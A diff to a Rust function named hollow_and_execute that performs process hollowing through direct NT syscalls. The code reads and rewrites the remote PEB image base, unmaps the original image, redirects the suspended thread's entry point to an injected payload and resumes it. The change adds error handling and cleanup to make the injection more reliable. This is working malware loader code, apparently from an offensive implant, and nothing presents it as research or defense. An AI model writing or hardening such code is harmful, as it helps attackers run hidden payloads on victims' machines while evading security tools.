@@ -596,7 +596,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         // Read PEB.ImageBaseAddress (offset 0x10) and unmap the original image.
         let mut remote_image_base: usize = 0;
         let mut rd: usize = 0;
-        let _ = nt_syscall::syscall!(
+        let read_status = nt_syscall::syscall!(
             "NtReadVirtualMemory",
             h_process as u64,
             peb_ptr.add(0x10) as u64,
@@ -604,6 +604,23 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             std::mem::size_of::<usize>() as u64,
             &mut rd as *mut _ as u64,
         );
+        if let Err(e) = &read_status {
+            nt_terminate_process!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) failed: {}", e));
+        }
+        if let Ok(s) = read_status {
+            if s < 0 {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
+                    s as u32));
+            }
+        }
         if remote_image_base != 0 {
             let us = nt_syscall::syscall!(
                 "NtUnmapViewOfSection",
@@ -723,33 +740,98 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         );
 
         // Update PEB.ImageBaseAddress.
-        let _ = nt_syscall::syscall!(
+        let peb_write_status = nt_syscall::syscall!(
             "NtWriteVirtualMemory",
             h_process as u64, peb_ptr.add(0x10) as u64,
             &remote_base as *const _ as u64,
             std::mem::size_of::<usize>() as u64,
             &mut written as *mut _ as u64,
         );
+        match peb_write_status {
+            Ok(s) if s >= 0 => {}
+            Ok(s) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
+                    s as u32));
+            }
+            Err(e) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) failed: {}", e));
+            }
+        }
 
         // Redirect the suspended thread's entry point to the hollowed payload.
         let mut ctx: winapi::um::winnt::CONTEXT = zeroed();
         ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
-        let s = nt_syscall::syscall!(
+        let get_ctx_status = nt_syscall::syscall!(
             "NtGetContextThread", h_thread as u64, &mut ctx as *mut _ as u64,
-        ).unwrap_or(-1);
-        if s < 0 {
-            tracing::warn!(
-                "hollow_and_execute: NtGetContextThread failed; skipping entry-point redirect");
-        } else {
-            ctx.Rip = (remote_base + entry_point_rva) as u64;
-            if nt_syscall::syscall!(
-                "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
-            ).unwrap_or(-1) < 0 {
-                tracing::warn!("hollow_and_execute: NtSetContextThread failed; continuing");
+        );
+        match get_ctx_status {
+            Ok(s) if s >= 0 => {
+                ctx.Rip = (remote_base + entry_point_rva) as u64;
+                let set_ctx_status = nt_syscall::syscall!(
+                    "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
+                );
+                match set_ctx_status {
+                    Ok(s2) if s2 >= 0 => {}
+                    Ok(s2) => {
+                        nt_terminate_process!(h_process);
+                        close_handle!(h_thread);
+                        close_handle!(h_process);
+                        return Err(anyhow!(
+                            "hollow_and_execute: NtSetContextThread NTSTATUS {:#010x}",
+                            s2 as u32));
+                    }
+                    Err(e) => {
+                        nt_terminate_process!(h_process);
+                        close_handle!(h_thread);
+                        close_handle!(h_process);
+                        return Err(anyhow!(
+                            "hollow_and_execute: NtSetContextThread failed: {}", e));
+                    }
+                }
+            }
+            Ok(s) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtGetContextThread NTSTATUS {:#010x}",
+                    s as u32));
+            }
+            Err(e) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtGetContextThread failed: {}", e));
             }
         }
 
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let resume_status = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+        match resume_status {
+            Ok(s) if s >= 0 => {}
+            Ok(s) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtResumeThread NTSTATUS {:#010x}", s as u32));
+            }
+            Err(e) => {
+                nt_terminate_process!(h_process);
+                close_handle!(h_thread);
+                close_handle!(h_process);
+                return Err(anyhow!(
+                    "hollow_and_execute: NtResumeThread failed: {}", e));
+            }
+        }
 
         close_handle!(h_thread);
         close_handle!(h_process);
